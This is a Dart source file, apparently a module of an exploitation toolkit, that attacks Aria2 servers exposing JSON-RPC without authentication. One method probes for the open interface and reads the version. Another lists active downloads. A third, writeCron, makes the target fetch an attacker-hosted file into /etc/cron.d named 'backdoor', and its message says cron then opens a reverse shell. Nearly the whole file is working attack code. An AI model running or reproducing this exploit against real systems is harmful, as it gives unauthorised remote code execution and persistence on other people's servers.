import 'dart:convert';

import 'package:http/http.dart' as http;

import 'exp_result.dart';

class Aria2ExpService {
  final String baseUrl;
  final Duration timeout;

  Aria2ExpService({
    required this.baseUrl,
    this.timeout = const Duration(seconds: 10),
  });

  String get _base =>
      baseUrl.endsWith('/') ? baseUrl.substring(0, baseUrl.length - 1) : baseUrl;

  Map<String, dynamic> _rpcBody(String method, List<dynamic> params) => {
        'jsonrpc': '2.0',
        'method': method,
        'id': 1,
        'params': params,
      };

  Future<ExpResult> check() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/jsonrpc'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(_rpcBody('aria2.getVersion', [])),
          )
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('version')) {
        final decoded = jsonDecode(res.body);
        final version = decoded['result']?['version'] ?? '未知';
        return ExpResult(true, 'Aria2 未授权 RPC', '未授权访问 JSON-RPC 接口，版本: $version');
      }
    } catch (_) {}
    return const ExpResult(false, 'Aria2 未授权 RPC', '');
  }

  Future<String?> listDownloads() async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/jsonrpc'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(_rpcBody('aria2.tellActive', [])),
          )
          .timeout(timeout);
      return res.body;
    } catch (_) {
      return null;
    }
  }

  /// 通过 aria2.addUri 将攻击者控制的文件写入 /etc/cron.d/
  /// [attackerUrl] 攻击者 HTTP 服务托管的 cron 文件 URL
  Future<String?> writeCron(String attackerUrl) async {
    try {
      final res = await http
          .post(
            Uri.parse('$_base/jsonrpc'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode(_rpcBody('aria2.addUri', [
              [attackerUrl],
              {'dir': '/etc/cron.d', 'out': 'backdoor'},
            ])),
          )
          .timeout(timeout);
      if (res.statusCode == 200 && res.body.contains('result')) {
        final decoded = jsonDecode(res.body);
        final gid = decoded['result'];
        return '任务已提交，GID: $gid。等待 aria2 下载完成后 cron 触发反弹 shell。';
      }
      return res.body;
    } catch (_) {
      return null;
    }
  }
}
